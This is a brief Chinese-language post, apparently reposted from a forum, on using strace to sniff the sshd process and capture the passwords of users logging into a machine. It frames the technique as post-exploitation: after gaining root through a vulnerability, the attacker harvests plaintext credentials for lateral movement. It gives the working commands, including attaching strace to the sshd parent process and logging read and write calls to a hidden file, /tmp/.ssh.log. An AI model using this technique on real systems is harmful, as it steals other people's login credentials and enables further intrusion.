# strace监听ssh来源流量

> 原文：[https://www.zhihuifly.com/t/topic/3489](https://www.zhihuifly.com/t/topic/3489)

# strace监听ssh来源流量

不只是可以监听连接他人，还可以用来抓到别人连入的密码。应用场景如：通过漏洞获取root权限，但是不知道明文密码在横向扩展中可以使用。

之前有用别名的方式来抓取登陆其他机器时的密码、同样也可以利用strace来监听登陆本地的sshd流量。

```
ps -ef | grep sshd #父进程PID
strace -f -p 12617 -o /tmp/.ssh.log -e trace=read,write,connect -s 2048 
```

![image](img/80b66cc4f2ac6766f46a608cebdd7b67.png)

![image](img/f5e2c91201ce308ce9ac8f534bbff45a.png)